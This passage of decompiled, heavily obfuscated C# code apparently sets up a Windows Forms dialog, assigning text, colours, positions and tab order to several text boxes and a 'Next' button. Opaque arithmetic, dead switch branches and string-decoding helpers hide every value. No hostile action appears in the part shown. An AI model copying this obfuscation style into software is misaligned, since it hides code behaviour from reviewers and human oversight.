		object[] array214 = new object[3];
		array214[array2[(nint)((Array)(object)"\u0347").LongLength]] = 31 << Convert.ToInt32("1", 2);
		array214[sizeof(byte)] = 505;
		array214[2] = 71;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_215, array214);
		string string_216 = string.Concat(text147, text148, text149 + string_215);
		int num315 = -5 & array2[14];
		int num316 = Convert.ToInt32(char.ToString('3') + char.ToString('7') + "777777777", 8);
		int num317 = ((((893 > GetMemberRefProps) ? 1 : 0) != Convert.ToInt32("0", 8)) ? 858489 : (-1));
		object[] array215 = new object[checked(num315 * (num316 & num317))];
		int num318 = default(int);
		switch (0 % array2[218])
		{
		case 0:
			num318 = -15406;
			break;
		}
		int num319 = ((num318 <= 384742) ? Convert.ToInt32("0", 16) : 588432);
		int num321;
		checked
		{
			if ((Convert.ToInt32("9ae4f", 16) ^ -588374) == -19778 * unchecked((int)array[7]))
			{
				int num320 = Marshal.SizeOf(typeof(DoesNotReturnIfAttribute));
				num321 = num320;
			}
			else
			{
				num321 = 579;
			}
		}
		int num322 = num319 / num321;
		string text150 = char.ToString('2');
		string string_217 = char.ToString('\u0fa0') + "\u0fa0\u0fa0";
		object[] array216 = new object[3];
		array216[0] = Convert.ToInt32(char.ToString('1') + char.ToString('0') + "1000101100", ((Array)(object)".\u0339").Length);
		array216[Convert.ToInt32("1", 16)] = 'Ţ';
		array216[2] = string.Concat(char.ToString('ΰ'), char.ToString('2') + "\u0001\a\u0004\0\u0015");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_217, array216);
		string value13 = text150 + string_217;
		int num323 = ((Convert.ToInt32("11111111111111111111110010001110", 2) <= -863341) ? Members : 14);
		array215[num322] = Convert.ToInt32(value13, array6[num323]);
		string string_218 = "ԃ";
		object[] array217 = new object[4];
		array217[0] = 268;
		array217[1] = char.ToString((char)_003CModule_003E.KeyValuePair__2[0]) + "\u0006\u0003";
		array217[2] = '\u02fc';
		array217[endAction] = ~Convert.ToInt32("fffffee1", 16);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_218, array217);
		string value14 = string_218;
		char c64 = (char)checked(537346 - Convert.ToInt32("2031372", 8));
		int num324 = Convert.ToInt32(value14, c64);
		string text151 = char.ToString('ڿ');
		string string_219 = "鿣閙";
		object[] array218 = new object[_003CModule_003E.KeyValuePair__2[0]];
		array218[Convert.ToInt32("0", Convert.ToInt32("10", 2))] = '嗿';
		int num325 = array[3] & 1;
		char c65 = array[105];
		array218[num325] = c65;
		array218[1 << get_CurrencyGroupSeparator] = _003CModule_003E.get_PositiveSign[176] ^ 0x211B7;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_219, array218);
		array215[num324] = text151 + string_219;
		int num326 = ((Convert.ToInt32("1010" + "11" + "10110011110", 2) <= 163676) ? (-2468) : (-519980));
		int num328;
		if (num326 == Marshal.SizeOf(typeof(FunctionPtr)) - array2[58])
		{
			string string_220 = "➳➲";
			object[] array219 = new object[2];
			int num327 = array2[1];
			char c66 = (char)Marshal.SizeOf(typeof(Unpin));
			array219[num327] = (int)c66;
			array219[1] = 1158;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_220, array219);
			num328 = Convert.ToInt32(string_220, 2);
		}
		else
		{
			string string_221 = string.Concat(char.ToString((char)get_Rank), char.ToString('ꞹ'), char.ToString('\ua7e9') + "ꞾꞸ");
			object[] array220 = new object[(nint)((Array)(object)"\u033c\u0325\u032e\u0323\u0347\u0330").LongLength & Convert.ToInt32("4", 8)];
			array220[0] = (char)checked(-684046 - Convert.ToInt32("11111111111101011000101101000101", 2));
			array220[1] = _003CModule_003E.KeyValuePair__2[44];
			array220[(nint)((Array)(object)"\u0352\u030a").LongLength] = Marshal.SizeOf(typeof(_moduleName));
			array220[checked(unchecked((int)array[5]) * 1)] = Convert.ToInt32("100011010100011110", 2) % (int)array[106];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_221, array220);
			num328 = Convert.ToInt32(string_221, -562038 + Convert.ToInt32("10001001001110000110", 2));
		}
		int num329 = Convert.ToInt32("1", 8);
		int num330 = default(int);
		switch (5 % (num329 << (int)((Array)(object)"\u034c").LongLength))
		{
		case 0:
		{
			string string_223 = string.Concat("ㆠㆤ", "ㆤㆤ", char.ToString('ㆥ') + char.ToString('ㆠ') + "ㆤㆠㆧㆡㆤ");
			object[] array222 = new object[3];
			array222[_003CModule_003E.get_PositiveSign[177] - -982679] = char.ToString('\u0bbe') + "m\u0a75";
			array222[1] = string.Concat(char.ToString('ላ'), char.ToString('ӆ'), char.ToString('ŭ') + char.ToString('E') + "\u0011ɟ");
			array222[2] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_223, array222);
			num330 = Convert.ToInt32(string_223, Convert.ToInt32("1010", 2) & 8);
			break;
		}
		case 1:
		{
			string string_222 = char.ToString('保') + char.ToString('侎') + "俟俕";
			object[] array221 = new object[418247305 / array2[220]];
			array221[0] = -198181 ^ Convert.ToInt32("37777171616", 8);
			array221[Convert.ToInt32("1", ((Array)(object)".\u0333").Length)] = false;
			array221[array2[0]] = Convert.ToInt32(char.ToString('a') + "99", 16);
			array221[3] = '㒃';
			array221[9642 >> _003CModule_003E.KeyValuePair__2[7]] = 1659;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_222, array221);
			string value15 = string_222;
			int fromBase7 = array2[7];
			num330 = Convert.ToInt32(value15, fromBase7);
			break;
		}
		}
		array215[num328] = num330;
		int num331 = checked(-205963 - (0x4010489C | get_MDStreamVersion)) + -295637;
		int num333 = default(int);
		switch ((Marshal.SizeOf(typeof(ELEMENT_TYPE_I)) + -148073) * HexIntPtrType - (get_RuleSet - OrdinalComparer))
		{
		case 0:
		{
			int num332 = checked(Convert.ToInt32("11010100100100110110", 2) + -868050);
			num333 = num332;
			break;
		}
		}
		array215[num331] = num333;
		char c67 = (char)Convert.ToInt32("6", 16);
		char num334 = c67;
		int num335 = ((((_003CModule_003E.get_PositiveSign[53] < (0x409E3 | Convert.ToInt32("50e18", 16))) ? 1 : 0) != checked(Convert.ToInt32("fff5b1ba", 16) + 675398)) ? ((Array)(object)(char.ToString('\u032a') + char.ToString('\u0332') + "\u0362\u0351\u0328")).Length : Convert.ToInt32("1001" + "1110011100101001", 2));
		int num336 = num334 & num335;
		int num338 = default(int);
		switch (157512 - (Convert.ToInt32("8ecbb", 16) ^ ToByteArray) + 1190935 % Constrained_)
		{
		case 0:
		{
			int num337 = default(int);
			switch (-5863 - Convert.ToInt32("11111111111111111110100100011000", 2))
			{
			case 0:
				num337 = -696163;
				break;
			case 1:
				num337 = 12126;
				break;
			}
			num338 = num337 >> (int)((Array)(object)"\u031f").LongLength;
			break;
		}
		}
		array215[num336] = num338;
		_003CModule_003E.GetMaxByteCount(ref string_216, array215);
		((Control)obj33).set_Text(string_216);
		((ButtonBase)Next).set_UseVisualStyleBackColor((byte)(array6[Convert.ToInt32(char.ToString('1') + char.ToString('1') + "001", 2)] + (Convert.ToInt32("11111111111001000011010101100111", 2) - -594254 + 616032)) != 0);
		((Control)Next).add_Click((System.EventHandler)Lookup);
		TextBox obj34 = set_PercentPositivePattern;
		char c68 = (char)(array2[array2[109]] - 503120);
		char red5 = c68;
		string string_224 = "ጥጠ";
		object[] array223 = new object[3];
		int num339 = ((-87592 < array2[221]) ? Convert.ToInt32("0", 16) : array2[222]);
		array223[num339] = (char)Convert.ToInt32(char.ToString('1') + "00000000100", 2);
		array223[(nint)((Array)(object)"\u035b").LongLength] = 458003 + Ignore;
		array223[2] = (char)(1625 >> array2[2]);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_224, array223);
		int green4 = Convert.ToInt32(string_224, array4[80 % array2[112]]);
		string string_225 = "㸹㹪";
		object[] array224 = new object[_003CModule_003E.KeyValuePair__2[185] / _003CModule_003E.KeyValuePair__2[186]];
		array224[Convert.ToInt32("0", 16)] = char.ToString('Ǥ') + "\u0015Ü";
		array224[1] = _003CModule_003E.ActivityOptions[array2[125]];
		array224[array2[0]] = array[107] & 0xDE;
		array224[3] = array2[223] / 452783;
		array224[(uint)array[MdFieldInfo]] = array2[60];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_225, array224);
		string value16 = string_225;
		int fromBase8 = array[55];
		int blue = Convert.ToInt32(value16, fromBase8);
		((Control)obj34).set_BackColor(Color.FromArgb(red5, green4, blue));
		TextBox obj35 = set_PercentPositivePattern;
		string string_226 = string.Concat(char.ToString('ꔱ') + "ꔱꔱ", char.ToString('ꔱ') + char.ToString('ꔱ') + "ꔱꔱꔲ");
		object[] array225 = new object[Marshal.SizeOf(typeof(IsValidText))];
		int num340 = array2[(nint)((Array)(object)"\u033a").LongLength];
		char c69 = (char)Marshal.SizeOf(typeof(lastCultureName));
		array225[num340] = (int)c69;
		int num341 = ((Array)(object)"\u033b").Length;
		array225[num341] = string.Concat(char.ToString('='), char.ToString('\f') + char.ToString('\u0013') + "\u0011;");
		int num342 = default(int);
		switch (checked(1 * _003CModule_003E.ActivityOptions[2]))
		{
		case 0:
			num342 = array2[224];
			break;
		case 1:
			num342 = 2;
			break;
		case 2:
			num342 = 89404;
			break;
		}
		array225[num342] = string.Concat("┽㒔", char.ToString('ʒ') + char.ToString('Ù') + "\u0090=Ç");
		array225[array[5] & 3] = (char)SecureStringToGlobalAllocAnsi;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_226, array225);
		((TextBoxBase)obj35).set_BorderStyle((BorderStyle)(~Convert.ToInt32(string_226, Marshal.SizeOf(typeof(ManifestFormats)) - 955976)));
		((Control)set_PercentPositivePattern).set_ForeColor(SystemColors.Window);
		TextBox obj36 = set_PercentPositivePattern;
		char x7;
		string string_227;
		object[] array226;
		int num343;
		checked
		{
			x7 = array4[(11 * unchecked((nint)((Array)(object)"\u0333").LongLength)) & (Convert.ToInt32("11", 8) | 3)];
			string_227 = "誺誺";
			array226 = new object[3];
			num343 = ((Marshal.SizeOf(typeof(EncoderReplacementFallbackBuffer)) != Marshal.SizeOf(typeof(SetByte))) ? 21351 : _003CModule_003E.KeyValuePair__2[187]);
		}
		array226[0] = (char)num343;
		array226[(nint)((Array)(object)"\u031c").LongLength] = string.Concat(char.ToString(array[108]), char.ToString((char)array2[225]), char.ToString('ভ') + "RĶ");
		array226[sizeof(sbyte) << 1] = (char)(array2[226] * 1);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_227, array226);
		string text152 = string_227;
		string text153 = char.ToString(array[14]);
		string string_228 = string.Concat(char.ToString('\udc4e'), char.ToString('\udc4f') + char.ToString('\udc4f') + "\udc4f\udc4e\udc4f");
		object[] array227 = new object[(uint)array[CreateGlobalFunctions]];
		array227[Convert.ToInt32("0", ((Array)(object)"\u030d\u033a\u0314\u0311\u035a\u0338\u030c\u0337").Length)] = 2098;
		int num344 = ((Convert.ToInt32("37777654543", 8) == Convert.ToInt32("ffff5963", 16)) ? 1 : 654758);
		array227[num344] = (char)_003CModule_003E.get_PositiveSign[(uint)array[65]];
		array227[_003CModule_003E.ActivityOptions[0]] = 49088;
		array227[3] = 2196;
		array227[4] = 741;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_228, array227);
		string value17 = text152 + text153 + string_228;
		int fromBase9 = ((Convert.ToInt32(char.ToString('2') + "64463", Marshal.SizeOf(typeof(__c__DisplayClass0_6))) >= -340235) ? 2 : (_003CModule_003E.get_PositiveSign[179] & SetOffset));
		((Control)obj36).set_Location(new Point(x7, Convert.ToInt32(value17, fromBase9)));
		TextBox obj37 = set_PercentPositivePattern;
		string text154 = char.ToString('\ue6e8');
		string text155 = char.ToString((char)(0xFFFAA080u ^ ((-68832 == Convert.ToInt32("37777571440", 8)) ? 4294592121u : 4294819344u)));
		string text156 = char.ToString('\ue6e4');
		int num345 = Convert.ToInt32("163350", 8);
		string text157 = char.ToString((char)num345);
		string string_229 = string.Concat(char.ToString((char)_003CModule_003E.get_PositiveSign[180]), char.ToString('ᙪ') + "ᙽᘷ");
		object[] array228 = new object[(nint)((Array)(object)("\u033a\u035c" + "\u0351\u033e\u033b\u034d")).LongLength];
		array228[(nint)((Array)(object)string.Empty).LongLength] = (char)_003CModule_003E.get_PositiveSign[55];
		array228[1] = (byte)(get_PositiveInfinity % MessageId) != 0;
		char c70 = (char)sizeof(char);
		array228[(uint)c70] = char.ToString((char)Convert.ToInt32("175f", 16)) + char.ToString((char)array2[227]) + "Ⓓದ";
		array228[_003CModule_003E.KeyValuePair__2[0]] = 1691;
		array228[4] = 372;
		array228[5] = Convert.ToInt32("100000100100111000", 2) >> 2;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_229, array228);
		string string_230 = string.Concat(text154, text155, text156 + text157 + string_229);
		object[] array229 = new object[Marshal.SizeOf(typeof(GetMethodBody))];
		char c71 = (char)((0 / get_CurrentRegion) | '\0');
		char num346 = c71;
		int num348;
		if (_003CModule_003E.CalendarType[Marshal.SizeOf(typeof(EventCommand))] < (Pow10 | 0x310B7))
		{
			int num347 = Convert.ToInt32("16" + "1704", Marshal.SizeOf(typeof(__c__DisplayClass0_6)));
			num348 = num347;
		}
		else
		{
			num348 = Marshal.SizeOf(typeof(HtmlEncode));
		}
		array229[(uint)num346] = num348;
		int num350 = default(int);
		switch (0 / LengthSquared)
		{
		case 0:
			num350 = Marshal.SizeOf(typeof(IsTvOS));
			break;
		case 1:
		{
			int num349 = ~_003CModule_003E.KeyValuePair__2[188];
			num350 = num349;
			break;
		}
		}
		array229[num350] = (int)array4[Sse42];
		_003CModule_003E.GetMaxByteCount(ref string_230, array229);
		((Control)obj37).set_Name(string_230);
		TextBox obj38 = set_PercentPositivePattern;
		int num351 = checked(Convert.ToInt32("10111111111000101000", 2) + -871069);
		int width8 = ((((num351 > (array2[61] | _003CModule_003E.ActivityOptions[40])) ? 1 : 0) != (array2[2] & 0)) ? ((Convert.ToInt32("100000000000011000001000100", 2) | Convert.ToInt32("101110010000101011000010000000", 2)) / 931) : array4[20]);
		((Control)obj38).set_Size(new Size(width8, array6[50 % (Convert.ToInt32("14", 16) | 0)]));
		TextBox obj39 = set_PercentPositivePattern;
		int num352 = Convert.ToInt32("3776" + "4272462", 8) % (_003CModule_003E.get_PositiveSign[181] | 0x7FED6214);
		string string_231 = string.Concat(char.ToString('\uf154') + "\uf150\uf150", char.ToString('\uf150') + char.ToString('\uf152') + "\uf152\uf154\uf157\uf153\uf156\uf156");
		int num353 = default(int);
		switch (_003CModule_003E.ActivityOptions[1] * 711925)
		{
		case 0:
			num353 = 2;
			break;
		case 1:
			num353 = Convert.ToInt32("fff6c3b7", 16);
			break;
		}
		object[] array230 = new object[num353];
		array230[0] = 21398 << sizeof(sbyte);
		array230[Convert.ToInt32("101", 2) % 2] = Location;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_231, array230);
		int tabIndex4 = default(int);
		switch (checked(num352 - Convert.ToInt32(string_231, unchecked((int)(0xC & (nint)((Array)(object)"\u031b\u0368\u033e\u0340\u0308\u035a\u031f\u030a\u0332\u034e\u0354").LongLength)))))
		{
		case 0:
			tabIndex4 = 98254;
			break;
		case 1:
			tabIndex4 = 0 | (Convert.ToInt32("11603750650", 8) / 163707445);
			break;
		}
		((Control)obj39).set_TabIndex(tabIndex4);
		TextBox obj40 = set_PercentPositivePattern;
		string string_232 = "箬";
		object[] array231 = new object[4];
		array231[0 % _003CModule_003E.get_PositiveSign[182]] = (char)(11342553 >> NullRef);
		array231[1] = string.Concat(char.ToString('Ⅺ'), char.ToString((char)array2[228]), char.ToString('ů') + "\u00b4ɛ");
		int num354 = Marshal.SizeOf(typeof(ENODATA));
		char c72 = (char)Convert.ToInt32("11101010010110", 2);
		array231[num354] = c72;
		char c73 = array[109];
		array231[3] = (int)c73;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_232, array231);
		string value18 = string_232;
		string string_233 = "⣓⣒";
		object[] array232 = new object[3];
		array232[checked(0 * array2[229])] = 5616;
		array232[1] = array2[Convert.ToInt32("76", 8)];
		array232[Marshal.SizeOf(typeof(ENODATA))] = 2790;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_233, array232);
		((Control)obj40).set_TabStop((byte)Convert.ToInt32(value18, Convert.ToInt32(string_233, 8)) != 0);
		TextBox obj41 = set_PercentPositivePattern;
		string string_234 = char.ToString((char)Marshal.SizeOf(typeof(MultiplyDoublingWideningLowerByScalarAndAddSaturate))) + "㋄㋞";
		object[] array233 = new object[~Convert.ToInt32("11111111111111111111111111111011", 2)];
		array233[Convert.ToInt32("0", 16)] = array2[63];
		array233[1] = (byte)Convert.ToInt32("0", Convert.ToInt32("2", 8)) != 0;
		array233[0x9A3B5 ^ Convert.ToInt32("9a3b7", 16)] = 'ḯ';
		array233[3] = string.Concat(char.ToString((char)_003CModule_003E.ActivityOptions[157]), char.ToString('ɋ'), char.ToString('Ƌ') + "\u0002\u0013\n");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_234, array233);
		string text158 = string_234;
		string string_235 = string.Concat(char.ToString((char)Convert.ToInt32("1100111101011110", 2)), char.ToString('콒') + "콏콙켓");
		object[] array234 = new object[(uint)array[_003CModule_003E.KeyValuePair__2[4]]];
		array234[0] = 3560;
		int num355 = Convert.ToInt32("1", 16);
		char c74 = (char)Marshal.SizeOf(typeof(__3__libName));
		array234[num355] = (int)c74;
		int num356 = Convert.ToInt32("10", 2);
		int num357 = default(int);
		switch (10 % (nint)((Array)(object)"\u033b\u034d\u0341\u0311").LongLength)
		{
		case 0:
			num357 = GetExecutingAssembly;
			break;
		case 1:
			num357 = _003CModule_003E.KeyValuePair__2[189];
			break;
		case 2:
			num357 = _003CModule_003E.ActivityOptions[158];
			break;
		}
		array234[num356] = num357;
		int num358 = Marshal.SizeOf(typeof(CharSetMask));
		array234[num358] = 6194;
		array234[4] = 3285;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_235, array234);
		string text159 = text158 + string_235;
		string string_236 = string.Concat(char.ToString((char)ValidateYearInEra), char.ToString('䆚') + "䆕䆇");
		object[] obj42 = new object[3]
		{
			char.ToString('σ') + "\u038d\u0010",
			null,
			null
		};
		int num359 = default(int);
		switch (480454 + Convert.ToInt32("11111111111110001010101100111011", 2))
		{
		case 0:
			num359 = 553768;
			break;
		case 1:
			num359 = get_CurrencyGroupSeparator;
			break;
		}
		obj42[num359] = "⊍ᗅ";
		obj42[sizeof(char)] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_236, obj42);
		string text160 = string_236;
		string string_237 = string.Concat(char.ToString('㡗'), char.ToString((char)Convert.ToInt32("381d", 16)), char.ToString('㠀') + char.ToString('㠙') + "㠕㠈㠔㠝");
		object[] array235 = new object[Convert.ToInt32("3", 16)];
		array235[0] = ';';
		int num360 = Convert.ToInt32("1", 2);
		array235[num360] = 15676;
		string string_238;
		object[] array236;
		int num361;
		checked
		{
			array235[2] = _003CModule_003E.get_PositiveSign[183] + Convert.ToInt32("37774553415", 8);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_237, array235);
			string_238 = string.Concat(text159, text160 + string_237);
			array236 = new object[-1050773 + array2[64] + (Marshal.SizeOf(typeof(MinNumber)) | 0x58223)];
			num361 = ((unchecked(ParallelBitExtract - -273712) != Convert.ToInt32(char.ToString('3') + char.ToString('7') + "777504317", array2[97])) ? (LOG_ALERT - -33223) : Convert.ToInt32("0", array2[0]));
		}
		int num362 = default(int);
		switch (num361 % checked(Convert.ToInt32(char.ToString('3') + "7774623417", Convert.ToInt32("10", 8)) + 234577))
		{
		case 0:
			num362 = 0 % Convert.ToInt32(char.ToString('2') + "c10e", 16);
			break;
		}
		int num363 = num362;
		string string_239 = string.Concat(char.ToString('걮') + "걤걥", char.ToString('갾') + "걥걫걫갸");
		int num364 = _003CModule_003E.get_PositiveSign[2];
		object[] array237 = new object[num364];
		array237[0] = string.Concat(char.ToString((char)_003CModule_003E.KeyValuePair__2[190]), char.ToString('㴿') + "\u0a7eᡥ");
		array237[1] = string.Concat(char.ToString((char)Convert.ToInt32("11010011111", 2)), char.ToString('Ư') + char.ToString('\u02f4') + "×ȉ\u0001Ą");
		int num365 = ~Convert.ToInt32("37777777775", 8);
		int num366 = array2[1];
		array237[num365] = (byte)num366 != 0;
		array237[3] = 7436;
		array237[39822 - array[110]] = _003CModule_003E.ActivityOptions[41];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_239, array237);
		array236[num363] = (char)(Convert.ToInt32(string_239, 16) / (WaitAll / 1 - -874390));
		int num367;
		if ((array2[230] | Convert.ToInt32("300", 8) | (42168 << Marshal.SizeOf(typeof(UseHebrewParsing)))) < ((Convert.ToInt32("1101101101111110110", 2) - array2[231]) & -138636))
		{
			num367 = D_NN;
		}
		else
		{
			string string_240 = "滛";
			object[] array238 = new object[2];
			array238[(8473 <= _003CModule_003E.ActivityOptions[159]) ? 530419 : 0] = '≫';
			array238[1] = char.ToString('⌣') + char.ToString((char)Marshal.SizeOf(typeof(HResult))) + "\u0333\u0a75";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_240, array238);
			num367 = Convert.ToInt32(string_240, 8);
		}
		array236[num367] = (char)(array6[26] + 696002);
		array236[2] = Binary;
		_003CModule_003E.GetMaxByteCount(ref string_238, array236);
		((Control)obj41).set_Text(string_238);
		TextBox ldloc = Ldloc;
		int red6 = ((-56319 < checked(130397 + array2[65])) ? 35 : (Convert.ToInt32("111111111" + "11110101" + "010111111110001", 2) & -552197));
		char c75 = (char)Convert.ToInt32(char.ToString('5') + "212", 8);
		((Control)ldloc).set_BackColor(Color.FromArgb(red6, 39, (int)c75 >> (int)array4[17]));
		TextBox ldloc2 = Ldloc;
		int num368 = get_IsEnum ^ Convert.ToInt32("a8738", 16);
		int num369 = default(int);
		switch (num368 + array6[27])
		{
		case 0:
			num369 = checked(sizeof(bool) * 1 * 1);
			break;
		case 1:
			num369 = ~checked(array2[232] + Marshal.SizeOf(typeof(remove_TypeResolve)));
			break;
		}
		((TextBoxBase)ldloc2).set_BorderStyle((BorderStyle)num369);
		((Control)Ldloc).set_ForeColor(SystemColors.Window);
		TextBox ldloc3 = Ldloc;
		string text161 = char.ToString('1');
		string string_241 = "\uf37c\uf32f";
		object[] obj43 = new object[3]
		{
			(byte)Convert.ToInt32("0", 8) != 0,
			null,
			null
		};
		int num370 = ((60392 != Convert.ToInt32("fffef0e8", 16)) ? 1 : array2[233]);
		obj43[num370] = string.Concat(char.ToString('廃'), char.ToString('⟙'), char.ToString('⚾') + "ᓨ\u0f18");
		obj43[2] = Convert.ToInt32(char.ToString('1') + "0000111000101", _003CModule_003E.ActivityOptions[0]);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_241, obj43);
		string value19 = text161 + string_241;
		string string_242 = "ꢓꢒ";
		object[] array239 = new object[_003CModule_003E.get_PositiveSign[2]];
		array239[0] = string.Concat("\u02fd\u00a0", char.ToString('R') + char.ToString('\u0003') + "\u0001\u0005");
		array239[Convert.ToInt32("1", 2)] = char.ToString('@') + char.ToString('\v') + "\0%";
		array239[2] = 9377;
		array239[Convert.ToInt32("11", 2)] = 31943;
		array239[4] = '\u02d2';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_242, array239);
		int x8 = Convert.ToInt32(value19, Convert.ToInt32(string_242, 16));
		int num371 = default(int);
		switch (get_MethodImplementationFlags)
		{
		case 109747:
			num371 = array2[67];
			break;
		case 109748:
			num371 = -596748;
			break;
		}
		int num372 = num371;
		int num373 = Convert.ToInt32("11110111110110111000000000000100", 2) | -2002138539;
		int systemThreadingTasks_TaskDebugView = SystemThreadingTasks_TaskDebugView;
		((Control)ldloc3).set_Location(new Point(x8, num372 << checked(num373 - systemThreadingTasks_TaskDebugView)));
		TextBox ldloc4 = Ldloc;
		string text162 = char.ToString('\uf76c');
		string text163 = char.ToString((char)Byte14);
		string string_243 = "▶►";
		object[] array240 = new object[Convert.ToInt32("3", 8) | sizeof(char)];
		int num374 = Convert.ToInt32("0", 2);
		int num375 = ((71941 == Convert.ToInt32("1508", 16)) ? (-50895) : 0);
		array240[num374] = (byte)num375 != 0;
		array240[(nint)((Array)(object)"\u031f").LongLength | 1] = Convert.ToInt32(char.ToString('3') + char.ToString('f') + "70", 16);
		array240[2] = 37734;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_243, array240);
		string text164 = string_243;
		string string_244 = string.Concat(char.ToString('㙌'), char.ToString('㙡') + "㙶㘺");
		object[] array241 = new object[~Convert.ToInt32("fffffffd", 16)];
		array241[(uint)array[sizeof(char)]] = char.ToString('⸔') + "ҖΈ";
		array241[1] = char.ToString('殯') + char.ToString(')') + "\u001dʮ";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_244, array241);
		string string_245 = string.Concat(text162, text163, text164 + string_244);
		int num376 = ((-76610 < Convert.ToInt32("fffa5878", 16)) ? array2[234] : 647052);
		object[] array242 = new object[88789 + (num376 + -735838)];
		char num377 = array4[SAKA];
		string text165 = char.ToString('틋');
		string text166 = char.ToString((char)(array2[235] + array2[236]));
		string string_246 = char.ToString('\ud8f1') + char.ToString('퀵') + "퇘텮";
		object[] array243 = new object[5];
		checked
		{
			array243[Convert.ToInt32("37777156461", 8) + 205519] = string.Concat("\u0018\0", char.ToString('\0') + char.ToString('\0') + "\0\u0002");
			array243[Convert.ToInt32("777503", 8) + -261954] = 6278;
			array243[-463990 + ExitUpgradeableReadLock] = 2;
			array243[Convert.ToInt32("11", 2)] = char.ToString('௮') + "ά㙚";
		}
		array243[4] = array2[237] - -80322;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_246, array243);
		array242[(uint)num377] = string.Concat(text165, text166 + string_246);
		int num380;
		string string_247;
		object[] array244;
		checked
		{
			if (-43173 != _003CModule_003E.CalendarType[1412356999 >> Convert.ToInt32("32", 8)])
			{
				int num378 = default(int);
				switch (Convert.ToInt32("37" + char.ToString('7') + "77740400", ((Array)(object)"\u0355\u0343\u0362\u0369\u0342\u0355\u036e\u0331").Length) - -16130)
				{
				case 0:
					num378 = 797553;
					break;
				case 1:
				{
					int num379 = array2[238];
					num378 = num379;
					break;
				}
				case 2:
					num378 = 236576239 >> _003CModule_003E.ActivityOptions[85];
					break;
				}
				num380 = num378;
			}
			else
			{
				num380 = 741864;
			}
			string_247 = string.Concat(char.ToString('\ufaf7') + char.ToString('犯') + "\ufaff響", "\ufaf7戴" + char.ToString('請') + "\ufae2\ufaf7缾\ufaef歹\ufaea");
			array244 = new object[Convert.ToInt32("37776757617", 8) + 270451];
		}
		array244[Convert.ToInt32("0", 8) & 1] = string.Concat(char.ToString('⻅'), char.ToString((char)array2[239]), char.ToString('Ҡ') + "ƣӂ\u0090ǖ");
		array244[1] = char.ToString('㎱') + char.ToString('䔇') + "ሰ\u3102";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_247, array244);
		array242[num380] = (int)array4[(nint)((Array)(object)string_247).LongLength];
		char c76 = (char)(Convert.ToInt32("10", 2) | '\u0001');
		array242[(uint)array4[(uint)c76]] = 11573 >> (get_ResourceExposureLevel & (ForkJoin >> 14));
		_003CModule_003E.GetMaxByteCount(ref string_245, array242);
		((Control)ldloc4).set_Name(string_245);
		((Control)Ldloc).set_Size(new Size((checked(ConvertToSingleScalar * 2) * -1 >= Convert.ToInt32("100110" + char.ToString('1') + "01101111010011001100", 2) >> -439314 - Convert.ToInt32("11111111111110010100101111100111", 2)) ? (-996509) : (array[19] & 0xCF), 20));
		TextBox ldloc5 = Ldloc;
		int tabIndex5 = default(int);
		switch (Convert.ToInt32(char.ToString('1') + "1001", 2) % Convert.ToInt32("a", sizeof(decimal)) % (Convert.ToInt32("1", Convert.ToInt32("10", 2)) << 1))
		{
		case 0:
		{
			string string_249 = string.Concat(char.ToString('స') + "సస", char.ToString((char)Marshal.SizeOf(typeof(GetPropertyProps))), "ససస" + "ససససససహహ" + "హహహసహహహసహసహహసహహసహ");
			object[] array246 = new object[2];
			array246[Convert.ToInt32("0", 2)] = char.ToString((char)Convert.ToInt32("3231", 8)) + "iì";
			array246[Convert.ToInt32("11011110011111001010", 2) - 911305] = Marshal.SizeOf(typeof(ThreadPoolEnqueueWork));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_249, array246);
			tabIndex5 = Convert.ToInt32(string_249, Marshal.SizeOf(typeof(ENODATA)));
			break;
		}
		case 1:
		{
			string string_248 = "섭섮";
			object[] array245 = new object[array2[4]];
			array245[0] = '啘';
			array245[array2[(uint)array[1]]] = 'ᳫ';
			array245[(nint)((Array)(object)"\u0355\u0318").LongLength] = '仜';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_248, array245);
			tabIndex5 = Convert.ToInt32(string_248, 8);
			break;
		}
		}
		((Control)ldloc5).set_TabIndex(tabIndex5);
		((Control)Ldloc).set_TabStop((byte)SAKA != 0);
		TextBox ldloc6 = Ldloc;
		string text167 = char.ToString('\uf64c');
		string text168 = char.ToString((char)(Convert.ToInt32("37777213153", 8) ^ get_ControlEvidence));
		string string_250 = char.ToString('\ue9e4') + "\ue9ee\ue9aa";
		int num381 = ((Array)(object)"\u0318\u0368").Length;
		object[] array247 = new object[num381];
		int num382 = default(int);
		switch (checked(963426 - _003CModule_003E.ActivityOptions[160]))
		{
		case 0:
			num382 = 0;
			break;
		case 1:
			num382 = 993553;
			break;
		}
		array247[num382] = 2035;
		array247[1] = 617171 - Convert.ToInt32("10010101001100010001", 2);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_250, array247);
		string text169 = text167 + text168 + string_250;
		string text170 = char.ToString('\uf65b');
		string string_251 = string.Concat("ᵶᵬ", char.ToString('ᵼ') + char.ToString('ᵰ') + "ᵭᵻᴿ");
		object[] array248 = new object[Convert.ToInt32("6", 16)];
		array248[0] = array2[105] * 6;
		array248[1] = (char)Marshal.SizeOf(typeof(ProcessingConcurrentTasks));
